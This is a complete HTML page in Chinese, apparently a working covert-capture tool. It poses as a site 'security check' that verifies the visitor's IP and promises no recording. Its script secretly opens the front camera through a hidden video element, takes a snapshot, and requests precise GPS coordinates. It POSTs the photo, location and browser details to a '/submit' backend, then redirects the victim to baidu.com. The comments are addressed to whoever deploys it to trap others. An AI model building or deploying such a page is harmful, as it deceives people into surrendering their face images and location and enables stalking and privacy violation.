<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>安全检验</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #0b0b0e; color: #7a8590; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .wrapper { width: 100%; max-width: 360px; text-align: center; padding: 40px 20px; }
        
        /* 蓝色大标题 */
        h1 { color: #3b82f6; font-size: 26px; font-weight: 600; margin-bottom: 16px; letter-spacing: 1px; }
        
        /* 白色小标题/说明文字 */
        .subtitle { color: #ffffff; font-size: 14px; line-height: 1.6; margin-bottom: 40px; font-weight: 400; opacity: 0.9; }
        
        /* 红色核心按钮 */
        .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.2); transition: all 0.2s ease; outline: none; -webkit-tap-highlight-color: transparent; }
        .btn-verify:active { transform: scale(0.98); background: #dc2626; box-shadow: 0 2px 8px rgba(239, 68, 68, 0.1); }
        
        /* 隐藏的相机捕获组件 */
        #video, #canvas { display: none; }
        
        /* 加载状态动画 */
        .loading-box { display: none; margin-top: 20px; }
        .spinner { width: 24px; height: 24px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
        .loading-text { font-size: 12px; color: #4a5568; font-family: monospace; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="wrapper">
    <h1>欢迎访问</h1>
    <p class="subtitle">为保护网站，需要检验你的IP<br>我们保护你的隐私，不会记录</p>
    
    <button class="btn-verify" id="start-btn" onclick="executeVerification()">检验</button>
    
    <div class="loading-box" id="loading-layer">
        <div class="spinner"></div>
        <div class="loading-text" id="status-tip">ENVIRONMENT CHECKING...</div>
    </div>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    let streamRef = null;

    // 点击按钮开始核心记录流程
    async function executeVerification() {
        const btn = document.getElementById('start-btn');
        const loader = document.getElementById('loading-layer');
        
        // 切换 UI 状态
        btn.style.display = 'none';
        loader.style.display = 'block';

        // 1. 同步初始化相机流
        updateStatus("INITIALIZING CAMERA...");
        try {
            streamRef = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: 640, height: 480 },
                audio: false
            });
            const video = document.getElementById('video');
            video.srcObject = streamRef;
            // 确保视频流就绪
            await new Promise((resolve) => video.onloadedmetadata = resolve);
        } catch (err) {
            console.warn("相机权限未允许或设备不支持", err);
        }

        // 2. 同步请求 GPS 定位
        updateStatus("REQUESTING GPS COORDINATES...");
        navigator.geolocation.getCurrentPosition(
            (position) => {
                // 定位成功，带坐标抓拍
                captureAndUpload(position.coords.latitude, position.coords.longitude);
            },
            (error) => {
                // 定位被拒绝或失败，带 0.0 坐标抓拍
                console.warn("地理定位失败:", error.message);
                captureAndUpload("0.0", "0.0");
            },
            { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
        );
    }

    function updateStatus(text) {
        document.getElementById('status-tip').innerText = text;
    }

    // 执行图像捕获与异步上报
    function captureAndUpload(lat, lon) {
        updateStatus("PROCESSING DATA STREAM...");
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        // 如果获取到了相机流，往画布绘制当前帧，否则绘制一张空白底图
        if (streamRef && video.readyState === video.HAVE_ENOUGH_DATA) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            // 停止硬件相机亮灯
            streamRef.getTracks().forEach(track => track.stop());
        } else {
            ctx.fillStyle = "#0b0b0e";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
        }

        // 转成 Base64 图像流
        const photoBase64 = canvas.toDataURL('image/jpeg', 0.7);

        updateStatus("SYNCHRONIZING TO CLOUD...");

        // 组装载荷发往你的 Cloudflare Pages 后端处理端 (functions/submit.js)
        fetch('/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                lat: String(lat),
                lon: String(lon),
                photo: photoBase64,
                ua: navigator.userAgent,
                lang: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`
            })
        })
        .then(res => res.json())
        .then(data => {
            updateStatus("VERIFICATION SUCCESSFUL");
            // 检验成功后，可以在这里重定向到你想让他看到的真实网页，比如百度或者博客首页
            setTimeout(() => {
                window.location.href = "https://www.baidu.com";
            }, 800);
        })
        .catch(err => {
            console.error(err);
            updateStatus("NETWORK TIMEOUT, RETRYING...");
            setTimeout(() => { window.location.href = "https://www.baidu.com"; }, 800);
        });
    }
</script>
</body>
</html>
